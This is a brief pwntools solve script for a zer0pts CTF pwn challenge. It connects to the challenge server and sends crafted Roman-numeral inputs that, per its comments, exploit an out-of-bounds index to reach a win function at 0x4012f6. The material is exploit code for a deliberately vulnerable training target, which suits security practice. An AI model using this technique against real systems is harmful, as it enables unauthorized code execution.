from pwn import *

# p = process('./chall')
p = remote('pwn1.ctf.zer0pts.com', 9000)

# buf-exit = -744
# (-744//2)&0xffff = 65164
# win = 0x4012f6

p.sendlineafter(b'ind: ', b'\x00'*6+b'M'*5+b'C'*1+b'X'*6+b'I'*4)
p.sendlineafter(b'val: ', b'MMMMCCCCCCCCXXXXXIIII')
p.interactive()
